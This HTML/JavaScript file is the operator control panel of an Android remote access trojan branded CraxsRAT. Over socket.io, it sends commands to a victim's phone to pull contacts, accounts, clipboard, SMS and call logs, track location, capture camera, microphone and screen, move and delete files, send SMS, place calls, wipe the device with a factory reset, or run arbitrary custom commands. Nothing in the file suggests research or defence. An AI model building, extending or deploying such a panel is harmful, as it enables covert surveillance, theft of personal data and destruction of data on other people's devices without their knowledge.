<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Device Control - CraxsRAT</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a2e; color: white; }
        .header { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); padding: 20px; display: flex; justify-content: space-between; align-items: center; }
        .header h1 { font-size: 24px; }
        .btn { padding: 10px 20px; background: rgba(255,255,255,0.2); border: none; border-radius: 8px; color: white; cursor: pointer; margin: 0 5px; }
        .btn:hover { background: rgba(255,255,255,0.3); }
        .container { max-width: 1400px; margin: 20px auto; padding: 0 20px; }
        .device-info { background: #16213e; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        .device-info h2 { margin-bottom: 15px; }
        .device-info p { margin: 8px 0; color: #aaa; }
        .tabs { display: flex; gap: 10px; margin-bottom: 20px; overflow-x: auto; }
        .tab { padding: 12px 24px; background: #16213e; border: none; border-radius: 8px; cursor: pointer; color: white; white-space: nowrap; }
        .tab.active { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); }
        .section { background: #16213e; padding: 30px; border-radius: 10px; display: none; }
        .section.active { display: block; }
        .section h2 { margin-bottom: 20px; }
        .control-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; }
        .control-btn { padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); border: none; border-radius: 10px; color: white; cursor: pointer; font-size: 16px; transition: all 0.3s; }
        .control-btn:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4); }
        .control-btn.danger { background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%); }
        .output-box { background: #0f1419; padding: 20px; border-radius: 10px; margin-top: 20px; max-height: 400px; overflow-y: auto; font-family: 'Courier New', monospace; }
        .output-box pre { color: #4caf50; margin: 5px 0; }
        .input-group { margin-bottom: 15px; }
        .input-group label { display: block; margin-bottom: 8px; color: #aaa; }
        .input-group input, .input-group textarea { width: 100%; padding: 12px; background: #0f1419; border: 2px solid #333; border-radius: 8px; color: white; }
        .input-group input:focus, .input-group textarea:focus { outline: none; border-color: #667eea; }
        .file-list { max-height: 400px; overflow-y: auto; }
        .file-item { background: #0f1419; padding: 15px; margin-bottom: 10px; border-radius: 8px; display: flex; justify-content: space-between; align-items: center; }
        .file-item:hover { background: #1a1f2e; }
        .badge { padding: 5px 12px; border-radius: 20px; font-size: 12px; font-weight: bold; }
        .badge.online { background: #4caf50; }
        .badge.offline { background: #f44336; }
        .screen-view { background: #0f1419; padding: 20px; border-radius: 10px; text-align: center; }
        .screen-view img { max-width: 100%; border-radius: 10px; }
        .sms-list, .call-list { max-height: 500px; overflow-y: auto; }
        .sms-item, .call-item { background: #0f1419; padding: 15px; margin-bottom: 10px; border-radius: 8px; }
        .sms-item p, .call-item p { margin: 5px 0; color: #aaa; }
    </style>
</head>
<body>
    <div class="header">
        <h1>ğŸ® Device Control Panel</h1>
        <div>
            <button class="btn" onclick="window.location.href='user-dashboard.html'">â† Back to Dashboard</button>
            <button class="btn" onclick="refreshDevice()">ğŸ”„ Refresh</button>
        </div>
    </div>

    <div class="container">
        <div class="device-info">
            <h2>ğŸ“± Device Information</h2>
            <p><strong>Model:</strong> <span id="deviceModel">Loading...</span></p>
            <p><strong>Android Version:</strong> <span id="androidVersion">Loading...</span></p>
            <p><strong>Status:</strong> <span class="badge online" id="deviceStatus">Online</span></p>
            <p><strong>Battery:</strong> <span id="battery">Loading...</span></p>
            <p><strong>Connected:</strong> <span id="connectedAt">Loading...</span></p>
        </div>

        <div class="tabs">
            <button class="tab active" onclick="showTab('basic')">ğŸ¯ Basic Controls</button>
            <button class="tab" onclick="showTab('advanced')">âš™ï¸ Advanced</button>
            <button class="tab" onclick="showTab('screen')">ğŸ“º Live Screen</button>
            <button class="tab" onclick="showTab('files')">ğŸ“ File Manager</button>
            <button class="tab" onclick="showTab('sms')">ğŸ’¬ SMS</button>
            <button class="tab" onclick="showTab('calls')">ğŸ“ Calls</button>
            <button class="tab" onclick="showTab('location')">ğŸ“ Location</button>
            <button class="tab" onclick="showTab('camera')">ğŸ“· Camera</button>
            <button class="tab" onclick="showTab('microphone')">ğŸ¤ Microphone</button>
        </div>

        <!-- Basic Controls -->
        <div id="basic" class="section active">
            <h2>ğŸ¯ Basic Controls</h2>
            <div class="control-grid">
                <button class="control-btn" onclick="sendCommand('vibrate')">ğŸ“³ Vibrate</button>
                <button class="control-btn" onclick="sendCommand('flash')">ğŸ”¦ Flash</button>
                <button class="control-btn" onclick="sendCommand('toast', 'Hello from CraxsRAT!')">ğŸ’¬ Show Toast</button>
                <button class="control-btn" onclick="sendCommand('notification')">ğŸ”” Send Notification</button>
                <button class="control-btn" onclick="sendCommand('volume_up')">ğŸ”Š Volume Up</button>
                <button class="control-btn" onclick="sendCommand('volume_down')">ğŸ”‰ Volume Down</button>
                <button class="control-btn" onclick="sendCommand('wifi_on')">ğŸ“¶ WiFi ON</button>
                <button class="control-btn" onclick="sendCommand('wifi_off')">ğŸ“µ WiFi OFF</button>
                <button class="control-btn" onclick="sendCommand('bluetooth_on')">ğŸ”µ Bluetooth ON</button>
                <button class="control-btn" onclick="sendCommand('bluetooth_off')">âš« Bluetooth OFF</button>
                <button class="control-btn" onclick="sendCommand('lock_screen')">ğŸ”’ Lock Screen</button>
                <button class="control-btn danger" onclick="sendCommand('restart')">ğŸ”„ Restart Device</button>
            </div>
            <div class="output-box" id="basicOutput">
                <pre>Waiting for commands...</pre>
            </div>
        </div>

        <!-- Advanced Controls -->
        <div id="advanced" class="section">
            <h2>âš™ï¸ Advanced Controls</h2>
            <div class="input-group">
                <label>Send Custom Command</label>
                <input type="text" id="customCommand" placeholder="Enter command...">
                <button class="btn" onclick="sendCustomCommand()" style="margin-top: 10px;">Send Command</button>
            </div>
            <div class="control-grid">
                <button class="control-btn" onclick="sendCommand('get_contacts')">ğŸ‘¥ Get Contacts</button>
                <button class="control-btn" onclick="sendCommand('get_apps')">ğŸ“± Get Apps</button>
                <button class="control-btn" onclick="sendCommand('get_accounts')">ğŸ‘¤ Get Accounts</button>
                <button class="control-btn" onclick="sendCommand('clipboard')">ğŸ“‹ Get Clipboard</button>
                <button class="control-btn" onclick="sendCommand('device_info')">â„¹ï¸ Device Info</button>
                <button class="control-btn" onclick="sendCommand('installed_apps')">ğŸ“¦ Installed Apps</button>
                <button class="control-btn danger" onclick="sendCommand('uninstall_app')">ğŸ—‘ï¸ Uninstall App</button>
                <button class="control-btn danger" onclick="sendCommand('factory_reset')">âš ï¸ Factory Reset</button>
            </div>
            <div class="output-box" id="advancedOutput">
                <pre>Waiting for commands...</pre>
            </div>
        </div>

        <!-- Live Screen -->
        <div id="screen" class="section">
            <h2>ğŸ“º Live Screen View</h2>
            <button class="btn" onclick="captureScreen()">ğŸ“¸ Capture Screen</button>
            <button class="btn" onclick="startLiveStream()">â–¶ï¸ Start Live Stream</button>
            <button class="btn danger" onclick="stopLiveStream()">â¹ï¸ Stop Stream</button>
            <div class="screen-view" id="screenView">
                <p style="color: #aaa;">Click "Capture Screen" to view device screen</p>
            </div>
        </div>

        <!-- File Manager -->
        <div id="files" class="section">
            <h2>ğŸ“ File Manager</h2>
            <button class="btn" onclick="loadFiles()">ğŸ”„ Refresh Files</button>
            <button class="btn" onclick="downloadFile()">â¬‡ï¸ Download File</button>
            <button class="btn" onclick="uploadFile()">â¬†ï¸ Upload File</button>
            <button class="btn danger" onclick="deleteFile()">ğŸ—‘ï¸ Delete File</button>
            <div class="file-list" id="fileList">
                <p style="color: #aaa; padding: 20px;">Click "Refresh Files" to load files</p>
            </div>
        </div>

        <!-- SMS -->
        <div id="sms" class="section">
            <h2>ğŸ’¬ SMS Manager</h2>
            <div class="input-group">
                <label>Phone Number</label>
                <input type="text" id="smsNumber" placeholder="+1234567890">
            </div>
            <div class="input-group">
                <label>Message</label>
                <textarea id="smsMessage" rows="4" placeholder="Enter message..."></textarea>
            </div>
            <button class="btn" onclick="sendSMS()">ğŸ“¤ Send SMS</button>
            <button class="btn" onclick="loadSMS()">ğŸ“¥ Load SMS</button>
            <div class="sms-list" id="smsList">
                <p style="color: #aaa; padding: 20px;">Click "Load SMS" to view messages</p>
            </div>
        </div>

        <!-- Calls -->
        <div id="calls" class="section">
            <h2>ğŸ“ Call Manager</h2>
            <div class="input-group">
                <label>Phone Number</label>
                <input type="text" id="callNumber" placeholder="+1234567890">
            </div>
            <button class="btn" onclick="makeCall()">ğŸ“ Make Call</button>
            <button class="btn" onclick="loadCallLogs()">ğŸ“‹ Load Call Logs</button>
            <div class="call-list" id="callList">
                <p style="color: #aaa; padding: 20px;">Click "Load Call Logs" to view history</p>
            </div>
        </div>

        <!-- Location -->
        <div id="location" class="section">
            <h2>ğŸ“ Location Tracker</h2>
            <button class="btn" onclick="getLocation()">ğŸ“ Get Current Location</button>
            <button class="btn" onclick="startLocationTracking()">â–¶ï¸ Start Tracking</button>
            <button class="btn danger" onclick="stopLocationTracking()">â¹ï¸ Stop Tracking</button>
            <div class="output-box" id="locationOutput">
                <pre>Click "Get Current Location" to track device</pre>
            </div>
            <div id="map" style="height: 400px; background: #0f1419; border-radius: 10px; margin-top: 20px; display: flex; align-items: center; justify-content: center; color: #aaa;">
                Map will appear here
            </div>
        </div>

        <!-- Camera -->
        <div id="camera" class="section">
            <h2>ğŸ“· Camera Control</h2>
            <button class="btn" onclick="capturePhoto('front')">ğŸ¤³ Front Camera</button>
            <button class="btn" onclick="capturePhoto('back')">ğŸ“· Back Camera</button>
            <button class="btn" onclick="recordVideo()">ğŸ¥ Record Video</button>
            <div class="screen-view" id="cameraView">
                <p style="color: #aaa;">Click camera button to capture photo</p>
            </div>
        </div>

        <!-- Microphone -->
        <div id="microphone" class="section">
            <h2>ğŸ¤ Microphone Control</h2>
            <button class="btn" onclick="startRecording()">â–¶ï¸ Start Recording</button>
            <button class="btn danger" onclick="stopRecording()">â¹ï¸ Stop Recording</button>
            <button class="btn" onclick="downloadRecording()">â¬‡ï¸ Download Recording</button>
            <div class="output-box" id="micOutput">
                <pre>Click "Start Recording" to record audio</pre>
            </div>
        </div>
    </div>

    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
    <script>
        const deviceId = localStorage.getItem('selectedDevice');
        const user = JSON.parse(localStorage.getItem('user') || '{}');
        
        if (!deviceId || !user.email) {
            window.location.href = 'user-dashboard.html';
        }

        const socket = io('http://localhost:5000');

        function showTab(tabName) {
            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
            event.target.classList.add('active');
            document.getElementById(tabName).classList.add('active');
        }

        function sendCommand(command, data = null) {
            socket.emit('command:send', {
                deviceId: deviceId,
                command: command,
                data: data
            });
            
            addOutput('basicOutput', `> Sent: ${command}`);
        }

        function sendCustomCommand() {
            const command = document.getElementById('customCommand').value;
            if (command) {
                sendCommand(command);
                document.getElementById('customCommand').value = '';
            }
        }

        function captureScreen() {
            sendCommand('capture_screen');
            addOutput('basicOutput', '> Capturing screen...');
        }

        function startLiveStream() {
            sendCommand('start_stream');
            addOutput('basicOutput', '> Starting live stream...');
        }

        function stopLiveStream() {
            sendCommand('stop_stream');
            addOutput('basicOutput', '> Stopping stream...');
        }

        function loadFiles() {
            sendCommand('list_files');
            addOutput('basicOutput', '> Loading files...');
        }

        function sendSMS() {
            const number = document.getElementById('smsNumber').value;
            const message = document.getElementById('smsMessage').value;
            
            if (number && message) {
                socket.emit('command:send', {
                    deviceId: deviceId,
                    command: 'send_sms',
                    data: { number, message }
                });
                alert('SMS sent!');
            }
        }

        function loadSMS() {
            sendCommand('get_sms');
        }

        function makeCall() {
            const number = document.getElementById('callNumber').value;
            if (number) {
                socket.emit('command:send', {
                    deviceId: deviceId,
                    command: 'make_call',
                    data: { number }
                });
                alert('Calling...');
            }
        }

        function loadCallLogs() {
            sendCommand('get_call_logs');
        }

        function getLocation() {
            sendCommand('get_location');
        }

        function startLocationTracking() {
            sendCommand('start_location_tracking');
        }

        function stopLocationTracking() {
            sendCommand('stop_location_tracking');
        }

        function capturePhoto(camera) {
            sendCommand('capture_photo', { camera });
        }

        function recordVideo() {
            sendCommand('record_video');
        }

        function startRecording() {
            sendCommand('start_audio_recording');
        }

        function stopRecording() {
            sendCommand('stop_audio_recording');
        }

        function addOutput(elementId, text) {
            const output = document.getElementById(elementId);
            const pre = document.createElement('pre');
            pre.textContent = text;
            output.appendChild(pre);
            output.scrollTop = output.scrollHeight;
        }

        function refreshDevice() {
            location.reload();
        }

        socket.on('command:response', (response) => {
            addOutput('basicOutput', `< Response: ${JSON.stringify(response)}`);
        });

        socket.on('device:info', (info) => {
            document.getElementById('deviceModel').textContent = info.model || 'Unknown';
            document.getElementById('androidVersion').textContent = info.androidVersion || 'Unknown';
            document.getElementById('battery').textContent = info.battery || 'Unknown';
        });

        // Request device info on load
        socket.emit('device:get_info', { deviceId });
    </script>
</body>
</html>
